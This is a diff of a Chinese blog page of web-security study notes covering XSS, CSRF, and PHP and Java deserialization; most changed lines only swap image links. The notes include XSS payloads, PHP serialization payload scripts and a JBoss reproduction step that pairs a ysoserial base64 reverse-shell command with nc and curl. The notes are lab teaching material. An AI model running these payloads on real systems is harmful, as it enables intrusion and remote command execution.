-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509160702020.png" alt="image-20220509160702020"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509160702020.png" alt="image-20220509160702020"></p>
 <h4 id="跨域访问："><a href="#跨域访问：" class="headerlink" title="跨域访问："></a>跨域访问：</h4><p><strong>可跨域标签：</strong></p>
 <table>
 <thead>
@@ -1156,7 +1187,7 @@
 </tr>
 <tr>
 <td align="left"><img> / <video> / <audio></audio></video></td>
-<td><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/..."></td>
+<td><img src="/2022/06/15/Web%E6%BC%8F%E6%B4%9E/..."></td>
 <td>嵌入多媒体资源</td>
 </tr>
 <tr>
@@ -1187,31 +1218,31 @@
 <p>JSON是一个标记符的序列。这套标记符包含六个构造字符、字符串、数字和三个字面名。</p>
 <p>JSON是一个序列化的对象或数组。</p>
 <p><a target="_blank" rel="noopener" href="http://10.211.55.2/lesson/xss/json.php">http://10.211.55.2/lesson/xss/json.php</a></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161431008.png" alt="image-20220509161431008"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161431008.png" alt="image-20220509161431008"></p>
 <p><strong>JSONP：</strong></p>
 <p>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写，它携带了json信息与回调函数名。</p>
 <p>JSONP实现跨域请求的原理简单的说，就是动态创建<script>标签，然后利用<script>的src 不受同源策略约束来跨域获取数据。</p>
 <p>JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p>
 <p><a target="_blank" rel="noopener" href="http://10.211.55.2/lesson/xss/jsonp.php">http://10.211.55.2/lesson/xss/jsonp.php</a></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161501438.png" alt="image-20220509161501438"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161501438.png" alt="image-20220509161501438"></p>
 <h3 id="5-3-XSS攻击"><a href="#5-3-XSS攻击" class="headerlink" title="5.3 XSS攻击"></a>5.3 XSS攻击</h3><h4 id="反射型XSS："><a href="#反射型XSS：" class="headerlink" title="反射型XSS："></a>反射型XSS：</h4><p>•主要用于将恶意脚本附加到请求参数中。</p>
 <p>•只在用户单击url时触发,而且只执行一次，非持久化。</p>
 <p>•常用来窃取客户端 Cookies或进行钓鱼欺骗。</p>
 <p>•常常为通过引诱用户点击一个恶意链接来实施攻击的。</p>
 <p><a target="_blank" rel="noopener" href="http://10.211.55.2/lesson/xss/reflect_xss.php">http://10.211.55.2/lesson/xss/reflect_xss.php</a></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161612469.png" alt="image-20220509161612469"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161617264.png" alt="image-20220509161617264"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161620333.png" alt="image-20220509161620333"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161612469.png" alt="image-20220509161612469"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161617264.png" alt="image-20220509161617264"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161620333.png" alt="image-20220509161620333"></p>
 <h4 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a>DOM型XSS：</h4><p>DOM型XSS其实是一种特殊类型的反射型XSS， 它是基于DOM文档对象模型的一种漏洞。它们都是非持久型xss漏洞，需要诱导用户点击，但也有区别：</p>
 <p>•反射型xss恶意参数传递给服务器，并由服务器返回，所以能够在response返回包中看到</p>
 <p>•DOM型xss不会传递给服务器，所以返回包看不到。</p>
 <p><a target="_blank" rel="noopener" href="http://10.211.55.2/lesson/xss/dom_xss.php">http://10.211.55.2/lesson/xss/dom_xss.php</a></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161639641.png" alt="image-20220509161639641"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161639641.png" alt="image-20220509161639641"></p>
 <h4 id="存储型XSS："><a href="#存储型XSS：" class="headerlink" title="存储型XSS："></a>存储型XSS：</h4><p>•恶意代码被保存到目标网站的服务器中，每次用户访问时都会执行脚本代码，这种攻击具有较强的稳定性和持久性。</p>
 <p>•比反射型跨站脚本更具威胁性,并且可能影响到Web服务器自身的安全。</p>
 <p>•一般出现在网站的留言、评论、日志等交互处。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161659201.png" alt="image-20220509161659201"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161701849.png" alt="image-20220509161701849"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161659201.png" alt="image-20220509161659201"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161701849.png" alt="image-20220509161701849"></p>
 <h4 id="XSS攻击方式："><a href="#XSS攻击方式：" class="headerlink" title="XSS攻击方式："></a>XSS攻击方式：</h4><p><strong>反射/DOM型：</strong></p>
 <p>•发现<a target="_blank" rel="noopener" href="http://example.com网站存在xss漏洞./">http://example.com网站存在xss漏洞。</a></p>
 <p>•攻击者构造xss漏洞恶意url链接，此链接可以盗取用户cookie。</p>
@@ -1224,7 +1255,7 @@
 <p>•用户A查看网站，并通过篡改后的登录表单登陆。</p>
 <p>•用户用户名密码等信息发送给攻击者。</p>
 <h4 id="JSONP-XSS："><a href="#JSONP-XSS：" class="headerlink" title="JSONP-XSS："></a>JSONP-XSS：</h4><p>如果JSONP端点对于用于传入的函数名参数callback处理不当，如未正确设置响应包的Content-Type、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509161744725.png" alt="image-20220509161744725"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509161744725.png" alt="image-20220509161744725"></p>
 <p>可以看到返回包Content-Type为text/html。</p>
 <p><strong>防御xss方法：</strong></p>
 <p>•设置Content-Type为application/json。</p>
@@ -1311,7 +1342,7 @@ img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
 
 •<a href=javascript:alert(1)>
 
-![image-20220509162306036](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509162306036.png)
+![image-20220509162306036](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509162306036.png)
 
 ### 5.5 XSS防御
 
@@ -1363,7 +1394,7 @@ http://10.211.55.5/dede/
 
 修改账户信息。
 
-![image-20220509162637027](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509162637027.png)
+![image-20220509162637027](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509162637027.png)
 
 #### CSRF和XSS的比较：
 
@@ -1395,7 +1426,7 @@ post：恶意Form表单
 
 #### 利用burpsuite的csrf poc功能：
 
-![image-20220509162935746](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509162935746.png)
+![image-20220509162935746](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509162935746.png)
 
 ### 6.3 CSRF防御
 
@@ -1440,7 +1471,7 @@ Lax
 
 None
 
-![image-20220509163702417](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509163702417.png)
+![image-20220509163702417](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509163702417.png)
 
 #### Token：
 
@@ -1458,7 +1489,7 @@ None
 
 JSON Web Token (JWT) 是一个开放标准，定义了一种传递 JSON 信息的方式。这些信息通过数字签名确保可信。
 
-![image-20220509163735690](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509163735690.png)
+![image-20220509163735690](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509163735690.png)
 
 #### CSRF Token：
 
@@ -1543,7 +1574,7 @@ dedecms v5.7 xss+csrf getshell
 
 4.**实例化**：new，从一个抽象的概念得到一个符合抽象概念的具体实例过程。
 
-![image-20220509165135419](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509165135419.png)
+![image-20220509165135419](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509165135419.png)
 
 **类的属性：**
 
@@ -1585,7 +1616,7 @@ http://10.211.55.2/lesson/unser/demo/2.php
 
 http://10.211.55.2/lesson/unser/demo/3.php
 
-![image-20220510135953343](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510135953343.png)
+![image-20220510135953343](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510135953343.png)
 
 #### 魔术方法：
 
@@ -1619,11 +1650,11 @@ __autoload() 在代码中当调用不存在的类时会自动调用该方法。
 
 http://10.211.55.2/lesson/unser/demo/4.php
 
-![image-20220510140119861](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140119861.png)
+![image-20220510140119861](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140119861.png)
 
-![image-20220510140123368](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140123368.png)
+![image-20220510140123368](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140123368.png)
 
-![image-20220510140126815](C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140126815.png)
+![image-20220510140126815](https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140126815.png)
 
 ### 7.3 PHP反序列化漏洞
 
@@ -1635,13 +1666,13 @@ http://10.211.55.2/lesson/unser/demo/5.php
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class info &#123;</span><br><span class="line">    public $data = &#x27;ls /&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new info();</span><br><span class="line">$o = serialize($a);</span><br><span class="line">print_r(urlencode($o));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140318069.png" alt="image-20220510140318069"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140318069.png" alt="image-20220510140318069"></p>
 <p><strong>CVE-2016-7124绕过__wakeup()</strong></p>
 <p>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</p>
 <p>PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SoFun&#123;</span><br><span class="line">    protected $file = &#x27;flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new SoFun();</span><br><span class="line">$o = serialize($a);</span><br><span class="line">print_r(urlencode($o));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140630224.png" alt="image-20220510140630224"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140630224.png" alt="image-20220510140630224"></p>
 <h4 id="phar的反序列化："><a href="#phar的反序列化：" class="headerlink" title="phar的反序列化："></a>phar的反序列化：</h4><p>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>参数可控的情况下，配合**phar://**伪协议，可以不依赖unserialize()直接进行反序列化操作。</p>
 <p><strong>phar文件：</strong></p>
 <p>phar归档文件可以方便地将多个文件打包为一个文件。</p>
@@ -1656,33 +1687,33 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>签名，放在文件末尾</p>
 <p><a target="_blank" rel="noopener" href="http://10.211.55.2/lesson/unser/7.php">http://10.211.55.2/lesson/unser/7.php</a></p>
 <p>构建一个phar文件，php内置了一个Phar类来处理相关操作。注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140823018.png" alt="image-20220510140823018"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140823018.png" alt="image-20220510140823018"></p>
 <p>可以看到meta-data是以序列化的形式存储的。</p>
 <p>前面我们刚刚说了， phar文件必须以__HALT_COMPILER();?&gt;来结尾。</p>
 <p>那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140835285.png" alt="image-20220510140835285"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140838213.png" alt="image-20220510140838213"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140835285.png" alt="image-20220510140835285"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140838213.png" alt="image-20220510140838213"></p>
 <p>phar文件要能够上传到服务器端。</p>
 <p>文件操作函数的参数可控。</p>
 <p>可以使用phar://伪协议。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140852762.png" alt="image-20220510140852762"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140852762.png" alt="image-20220510140852762"></p>
 <h4 id="Session反序列化："><a href="#Session反序列化：" class="headerlink" title="Session反序列化："></a>Session反序列化：</h4><p><strong>反序列化引擎差异性造成的漏洞</strong></p>
 <p>PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。</p>
 <p>PHP session的存储机制是由session.serialize_handler来定义引擎的，默认是以文件的方式存储， session.serialize_handler定义的引擎有三种，如下表所示：</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510140943784.png" alt="image-20220510140943784"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510140943784.png" alt="image-20220510140943784"></p>
 <p>如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。</p>
 <p><strong>php_serialize:</strong></p>
 <p>a:1表示$_SESSION数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141131549.png" alt="image-20220510141131549"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141133968.png" alt="image-20220510141133968"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141131549.png" alt="image-20220510141131549"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141133968.png" alt="image-20220510141133968"></p>
 <p><strong>php_binary:</strong></p>
 <p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为#，所以最终的结果如下图所示：</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141147299.png" alt="image-20220510141147299"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141149862.png" alt="image-20220510141149862"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141147299.png" alt="image-20220510141147299"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141149862.png" alt="image-20220510141149862"></p>
 <p><strong>php:</strong></p>
 <p>session 为$_SESSION[‘session’]的键名，|后为传入 session 经过序列化后的值。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141201698.png" alt="image-20220510141201698"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141204216.png" alt="image-20220510141204216"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141201698.png" alt="image-20220510141201698"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141204216.png" alt="image-20220510141204216"></p>
 <p>简单来说php处理器和php_serialize处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p>
 <p>形成的原理就是在用php_serialize存储的字符可以引入 | , 再用php格式取出$_SESSION的值时， | 会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
 <h4 id="反序列化漏洞POP链："><a href="#反序列化漏洞POP链：" class="headerlink" title="反序列化漏洞POP链："></a>反序列化漏洞POP链：</h4><p>在PHP中反序列化时，首先调用此类的__ wakeup魔术方法，然后会根据对类的操作调用其他相应的魔术方法，最后调用__destruct析构函数。</p>
@@ -1695,26 +1726,26 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p><a target="_blank" rel="noopener" href="https://github.com/typecho/typecho/archive/refs/tags/v1.0-14.10.10-release.zip">https://github.com/typecho/typecho/archive/refs/tags/v1.0-14.10.10-release.zip</a></p>
 <p>/install.php 288-235行</p>
 <p>可以看到前面代码中只要get传入finish参数，就可以将cookie中的__typecho_config值base64解码然后反序列化。然后将反序列化结果的$config[‘adapter’]和$config[‘prefix’]值传入Typecho_Db类并实例化。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141435930.png" alt="image-20220510141435930"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141439109.png" alt="image-20220510141439109"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141435930.png" alt="image-20220510141435930"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141439109.png" alt="image-20220510141439109"></p>
 <p>Var/Tepecho/Db.php 114-120行</p>
 <p>前面代码中$config[‘adapter’],会传入Typecho_Db类的__construct魔术方法，并在120行进行了一个字符串拼接的操作，也就是说如果$adapterName是一个对象，且含有__toString魔术方法，就可以继续往下构造。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141505495.png" alt="image-20220510141505495"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141505495.png" alt="image-20220510141505495"></p>
 <p>全局搜索__toString()</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141518666.png" alt="image-20220510141518666"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141518666.png" alt="image-20220510141518666"></p>
 <p>Var/Tepecho/Feed.php 358行</p>
 <p>这里调用了$item[‘author’]的screenName，screenName本身是一个不存在的属性，如果不存在的话就会调用__get()方法。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141530759.png" alt="image-20220510141530759"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141530759.png" alt="image-20220510141530759"></p>
 <p>全局搜索_get()</p>
 <p>Var/Tepecho/Request.php 267-270行</p>
 <p>__get()方法调用了get()方法</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141549812.png" alt="image-20220510141549812"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141549812.png" alt="image-20220510141549812"></p>
 <p>Var/Tepecho/Request.php 293-309行</p>
 <p>get()方法调用__applyFilter()方法</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141558717.png" alt="image-20220510141558717"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141558717.png" alt="image-20220510141558717"></p>
 <p>Var/Tepecho/Request.php 267-270行</p>
 <p>跟进__applyFilter()方法发现存在call_user_func()方法可以构造命令执行。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510141634105.png" alt="image-20220510141634105"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510141634105.png" alt="image-20220510141634105"></p>
 <p><strong>POP链思路：</strong></p>
 <p>1.Typecho_Request()类的__applyFilter()方法中存在call_user_func()方法，可以构造命令执行call_user_func ($filter, $value)</p>
 <p>2.Typecho_Request()类__get()魔术方法调用get()方法调用__applyFilter()</p>
@@ -1731,13 +1762,13 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>一个类的对象要想序列化成功，必须满足两个条件：</p>
 <p>1.该类必须实现 java.io.Serializable 接口。</p>
 <p>2.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510142908171.png" alt="image-20220510142908171"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510142908171.png" alt="image-20220510142908171"></p>
 <h4 id="序列化方法："><a href="#序列化方法：" class="headerlink" title="序列化方法："></a>序列化方法：</h4><p>java.io.ObjectOutputStream 代表对象输出流，它的 writeObject() 方法可对参数指定的对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510142922505.png" alt="image-20220510142922505"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510142925010.png" alt="image-20220510142925010"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510142922505.png" alt="image-20220510142922505"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510142925010.png" alt="image-20220510142925010"></p>
 <h4 id="反序列化方法："><a href="#反序列化方法：" class="headerlink" title="反序列化方法："></a>反序列化方法：</h4><p>java.io.ObjectInputStream 代表对象输入流，它的 readObject() 方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510142935669.png" alt="image-20220510142935669"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510142938039.png" alt="image-20220510142938039"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510142935669.png" alt="image-20220510142935669"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510142938039.png" alt="image-20220510142938039"></p>
 <h3 id="8-2-JAVA反序列化漏洞"><a href="#8-2-JAVA反序列化漏洞" class="headerlink" title="8.2 JAVA反序列化漏洞"></a>8.2 JAVA反序列化漏洞</h3><h4 id="Java反序列化漏洞成因："><a href="#Java反序列化漏洞成因：" class="headerlink" title="Java反序列化漏洞成因："></a>Java反序列化漏洞成因：</h4><p>序列化和反序列化本身并不存在问题。但当<strong>暴露或间接暴露反序列化API</strong> ，导致用户可以操作传入数据。攻击者可以精心构造反序列化对象并执行恶意代码，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
 <p><strong>反序列化应用场景：</strong></p>
 <p>1.<strong>HTTP</strong>，多平台之间的通信，管理中请求的参数。</p>
@@ -1748,9 +1779,9 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p><strong>重写readObject()：</strong></p>
 <p>JAVA中执行系统命令的方法，通过执行Runtime.getRuntime().exec()函数执行命令。</p>
 <p>将命令执行函数写进readObject()。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143104678.png" alt="image-20220510143104678"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143104678.png" alt="image-20220510143104678"></p>
 <h4 id="反序列化漏洞利用："><a href="#反序列化漏洞利用：" class="headerlink" title="反序列化漏洞利用："></a>反序列化漏洞利用：</h4><p>可以看到在反序列化操作过程中，java执行了重写readObject()方法，并打开了计算机。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143122660.png" alt="image-20220510143122660"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143122660.png" alt="image-20220510143122660"></p>
 <h4 id="反射链："><a href="#反射链：" class="headerlink" title="反射链："></a>反射链：</h4><p>当然了，刚刚是一个非常极端的例子，在真实场景中，在反序列化操作的过程中，某个类调用了readObject()方法，大概不会有人真的在readObject()中写入一段可控命令执行的代码。但是一般会有其他的代码逻辑，如果它的代码逻辑的某个分支可控，或者某个分支触发的其他函数可控，那么就极可能造成java反序列化漏洞，比如说反射链。</p>
 <p><strong>Java反射：</strong></p>
 <p>对于任意一个类，都能够得到这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。</p>
@@ -1761,7 +1792,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>4.要得到类的方法和属性，首先就要得到该类对象</p>
 <p><strong>利用反射机制命令执行：</strong></p>
 <p>下述代码中,利用了Java的反射机制把我们的代码意图都利用字符串的形式进行体现，使得可以动态调用java类方法可以，而这个机制也是后续的漏洞使用、构造反射链的前提。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143157053.png" alt="image-20220510143157053"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143157053.png" alt="image-20220510143157053"></p>
 <p><strong>ysoserial：</strong></p>
 <p>ysoserial是一款用于生成利用不安全的Java对象反序列化的有效负载的概念验证工具。可以通过这个工具生成各种Java反序列化链的payloads</p>
 <p>Java开发过程中常使用一些公共库。比如说Apache Commons Collections但也有很多能够利用的反射链（CC链）</p>
@@ -1774,7 +1805,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>安装过后会在目录下生成最新的ysoserial.jar</p>
 <p>漏洞环境使用vulhub的docker</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143226743.png" alt="image-20220510143226743"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143226743.png" alt="image-20220510143226743"></p>
 <h4 id="JBoss-JMXInvokerServlet-反序列化漏洞（CVE-2015-7501）："><a href="#JBoss-JMXInvokerServlet-反序列化漏洞（CVE-2015-7501）：" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）："></a>JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）：</h4><p>JBoss是一套开源的企业级Java中间件系统。</p>
 <p><strong>复现：</strong></p>
 <p>由于JBoss中invoker/JMXInvokerServlet路径对外开放，JBoss的jmx组件支持Java反序列化，如果漏洞存在可以访问到这个链接，并获取JMXInvokerServlet:</p>
@@ -1793,7 +1824,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>1.使用ysoserial来复现生成序列化数据<br> java -jar ysoserial.jar CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=}|{base64,-d}|{bash,-i}” &gt;poc.ser  Vulhub使用的Java版本较新，CommonsCollections5、6、7都可以（base部分自己修改IP端口）</p>
 <p>2.Nc监听本机端口<br> nc -lvvp 4444</p>
 <p>3.利用curl将payload发送给漏洞入口<br> curl <a target="_blank" rel="noopener" href="http://ip:8080/invoker/readonly">http://ip:8080/invoker/readonly</a> –data-binary @poc.ser</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143349482.png" alt="image-20220510143349482"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143349482.png" alt="image-20220510143349482"></p>
 <h4 id="Fastjson-lt-1-2-47-反序列化漏洞（CNVD-2019-22238）："><a href="#Fastjson-lt-1-2-47-反序列化漏洞（CNVD-2019-22238）：" class="headerlink" title="Fastjson &lt;=1.2.47 反序列化漏洞（CNVD-2019-22238）："></a>Fastjson &lt;=1.2.47 反序列化漏洞（CNVD-2019-22238）：</h4><p>FastJson是一个Java语言编写的高性能功能完善的JSON库，可以将数据在JSON和Java Object之间互相转换。</p>
